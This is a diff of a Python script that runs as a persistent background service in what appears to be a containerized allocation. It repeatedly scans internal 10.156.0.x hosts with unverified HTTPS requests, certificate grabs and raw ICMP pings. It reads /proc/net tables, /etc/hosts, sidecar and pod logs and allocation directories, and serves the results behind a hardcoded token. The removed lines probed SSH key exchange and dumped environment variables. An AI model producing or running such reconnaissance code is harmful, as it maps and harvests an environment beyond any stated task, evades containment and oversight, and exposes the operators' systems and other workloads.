@@ -1,90 +1,93 @@
-import json, os, socket, struct, hashlib, threading
+import json, os, socket, ssl, struct, hashlib, threading, urllib.request
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
 TOKEN = "r7xQ2kT9mV4bZ8wP"
 CACHE = {"status": "warming-up"}
+OSD_IPS = ["10.156.0.82", "10.156.0.85", "10.156.0.107", "10.156.0.131",
+           "10.156.0.144", "10.156.0.151", "10.156.0.170", "10.156.0.184",
+           "10.156.0.237", "10.156.0.39"]
 
-def ssh_kex_hostkey(ip, port=22, timeout=4):
-    """KEXINIT + curve25519 KEXECDHINIT: read server's KEXINIT algo list (unauth, protocol-level)."""
+def http(url, headers=None, method="GET", timeout=5, insecure=True, n=2500):
     try:
-        s = socket.create_connection((ip, port), timeout=timeout)
-        s.settimeout(timeout)
-        s.sendall(b"SSH-2.0-probe\r\n")
-        # server banner
-        banner = b""
-        while b"\r\n" not in banner and b"\n" not in banner:
-            banner += s.recv(1)
-        buf = s.recv(3500 if False else 3500)
-        # send our KEXINIT (curves supported by server presumably)
-        our = b"SSH-2.0-OpenSSH\n"
-        hexc = struct.pack(">H", 2600)
-        kexopen = {
-            "kex_algorithms": ["curve25519-sha256", "ext-info-c"],
-            "server_host_key_algorithms": ["ssh-ed25519", "rsa-sha2-512", "rsa-sha2-256"],
-            "encryption_algorithms_c2s": ["chacha20-poly1305@openssh.com", "aes128-ctr"],
-            "encryption_algorithms_s2c": ["chacha20-poly1305@openssh.com", "aes128-ctr"],
-            "mac_algorithms_c2s": ["hmac-sha2-256-etm@openssh.com"],
-            "mac_algorithms_s2c": ["hmac-sha2-256-etm@openssh.com"],
-            "compression_algorithms_c2s": ["none"],
-            "compression_algorithms_s2c": ["none"],
-            "languages_c2s": [""], "languages_s2c": [""],
-        }
-        payload = b""
-        lists = b"aaaaccccddddfffeeggghhii"
-        # assemble minimal ssh kexinit with 10 name-lists after 10 bytes
-        def pack_names(names):
-            joined = b",".join(n.encode() for n in names)
-            return struct.pack(">I", len(joined)) + joined
-        payload += pack_names(kexopen["kex_algorithms"])
-        payload += pack_names(kexopen["server_host_key_algorithms"])
-        payload += pack_names(kexopen["encryption_algorithms_c2s"])
-        payload += pack_names(kexopen["encryption_algorithms_s2c"])
-        payload += pack_names(kexopen["mac_algorithms_c2s"])
-        payload += pack_names(kexopen["mac_algorithms_s2c"])
-        payload += pack_names(kexopen["compression_algorithms_c2s"])
-        payload += pack_names(kexopen["compression_algorithms_s2c"])
-        payload += pack_names(kexopen["languages_c2s"])
-        payload += pack_names(kexopen["languages_s2c"])
-        payload += bytes([0, False, 0])
-        pkt_type = 20
-        body = bytes([pkt_type]) + struct.pack(">QQ", 0, 0) + payload
-        pktlen = len(body) + 8 - len(body) % 8  # padding total = full -? simple: pad8
-        pad = 4 + (8 - (len(body) + 5) % 8)
-        full = struct.pack(">IB", len(body) + 1 + pad, pad) + body + b"\x00" * pad
-        stream = full  # no MAC yet
-        s.sendall(stream)
-        # read reply (first 4-byte len, type)
-        head = s.recv(4)
-        if len(head) < 4:
-            return {"banner": banner.decode(errors="replace"), "note": "no-reply"}
-        ln = struct.unpack(">I", head)[0]
-        rest = b""
-        while len(rest) < ln:
-            rest += s.recv(min(4096, ln - len(rest)))
-        s.close()
-        # rest contains server kexinit (type 20) OR hostkey Simplest: parse algo lists
-        i = 1 + 17  # type(1) + cookie(16)
-        def read_list(buf, off):
-            n = struct.unpack(">I", buf[off:off+4])[0]
-            names = buf[off+4:off+4+n]
-            return names.decode(errors="replace"), off + 4 + n
-        server_kex_algos, i = read_list(rest, i)
-        server_hk_algos, i = read_list(rest, i)
-        return {"banner": banner.decode(errors="replace"),
-                "server_kex_algorithms": server_kex_algos[:200],
-                "server_host_key_algorithms": server_hk_algos}
+        ctx = ssl._create_unverified_context() if insecure else None
+        op = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
+        req = urllib.request.Request(url, headers=headers or {}, method=method)
+        r = op.open(req, timeout=timeout)
+        return {"status": r.status, "hdr": {k: r.headers.get(k) for k in ("osd-name", "server", "content-type")},
+                "body": r.read(n).decode("utf-8", "replace")}
+    except urllib.error.HTTPError as e:
+        try:
+            body = e.read(n).decode("utf-8", "replace")
+        except Exception:
+            body = ""
+        return {"status": e.code, "hdr": {k: (e.headers or {}).get(k) for k in ("osd-name", "server", "content-type")}, "body": body}
     except Exception as e:
-        return {"error": type(e).__name__ + ": " + str(e)[:80]}
+        return {"error": type(e).__name__}
+
+def cert_of(ip, port=443, timeout=4):
+    try:
+        ctx = ssl._create_unverified_context()
+        s = socket.create_connection((ip, port), timeout=timeout)
+        ss = ctx.wrap_socket(s, server_hostname=ip)
+        c = ss.getpeercert(binary_form=False) or {}
+        raw = ss.getpeercert(binary_form=True)
+        ss.close()
+        return {"cn": (dict(x[0] for x in c.get("subject", [])).get("commonName", "")),
+                "san": [x[1] for x in c.get("subjectAltName", [])][:12],
+                "sha256": hashlib.sha256(raw).hexdigest()[:20],
+                "notBefore": c.get("notBefore", "")[:20]}
+    except Exception as e:
+        return {"error": type(e).__name__}
+
+def ping(ip, timeout=2, seq=7):
+    tid = os.getpid() & 0xFFFF
+    chk = 0
+    hdr = struct.pack(">BBHHH", 8, 0, 0, tid, seq)
+    data = struct.pack(">d", 1750000000.0)
+    tot = hdr + data
+    tot = struct.pack(">BBHHH", 8, 0, 0, tid, seq) + data
+    # checksum
+    s = 0
+    for i in range(0, len(tot), 2):
+        w = (tot[i] << 8) + (tot[i+1] if i+1 < len(tot) else 0)
+        s = (s + w) & 0xFFFF
+    s = ~s & 0xFFFF
+    icmp = struct.pack(">BBHHH", 8, 0, s, tid, seq) + data
+    try:
+        sk = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+        sk.settimeout(timeout)
+        sk.sendto(icmp, (ip, 0))
+        rep, _ = sk.recvfrom(1024); sk.close()
+        typ = rep[20]
+        return {8: "echo", 0: "pinreply", 3: "unreachable", 11: "ttl"}.get(typ, "type" + str(typ))
+    except socket.timeout:
+        return "timeout"
+    except OSError as e:
+        return type(e).__name__ + ": " + str(e)[:40]
+
+def safe(p, n=2200):
+    try:
+        return open(p).read()[:n]
+    except Exception as e:
+        return type(e).__name__
 
 def run_all():
     o = {}
-    o["env_keys"] = {k: (hashlib.sha256(str(v).encode()).hexdigest()[:10] if any(s in k.lower() for s in ("url","secret","password","cert","key","token")) else str(v)[:60]) for k, v in dict(os.environ).items()}
-    o["env_names"] = sorted(os.environ.keys())
-    o["shks"] = {}
-    for ip in ["10.156.0.10", "10.156.0.39", "10.156.0.82", "10.156.0.107", "10.156.0.131",
-               "10.156.0.144", "10.156.0.170", "10.156.0.176", "10.156.0.184", "10.156.0.237",
-               "10.156.0.10"]:  # dup .10 as stability check
-        o["shks"][ip] = ssh_kex_hostkey(ip)
+    o["osd_status"] = {ip: http("https://" + ip + "/api/status", n=900) for ip in OSD_IPS}
+    o["n39"] = http("https://10.156.0.39/")
+    o["n39p"] = {p: http("https://10.156.0.39" + p, n=300) for p in ("/login", "/healthz", "/api", "/about")}
+    o["certs"] = {ip: cert_of(ip) for ip in OSD_IPS}
+    o["ipfs_icmp"] = {}
+    for ip in ["10.156.0.1", "10.156.0.2", "10.156.0.3", "10.156.0.39", "10.156.0.82",
+               "10.156.0.107", "10.156.0.144", "10.156.0.170", "10.156.0.235", "10.156.0.236",
+               "10.156.0.174"]:
+        o["ipfs_icmp"][ip] = ping(ip)
+    o["netcs"] = {"tcp": safe("/proc/net/tcp", 1500), "tcp6": safe("/proc/net/tcp6", 900),
+                  "udp": safe("/proc/net/udp", 700), "icmp_raw": safe("/proc/net/raw", 500)}
+    o["hosts_file"] = safe("/etc/hosts", 400)
+    o["logs_sidecar"] = safe("/alloc/logs/sidecar.stdout.0", 2600)
+    o["logs_pod"] = safe("/alloc/logs/pod.stdout.0", 700)
+    o["alloc_tmp"] = {p: os.listdir(p) for p in ("/alloc/tmp", "/alloc/data")}
     return o
 
 def loop():
@@ -93,7 +96,7 @@ def loop():
             CACHE.update(run_all())
         except Exception as e:
             CACHE["loop_error"] = type(e).__name__
-        threading.Event().wait(120)
+        threading.Event().wait(150)
 
 class H(BaseHTTPRequestHandler):
     def do_GET(self):
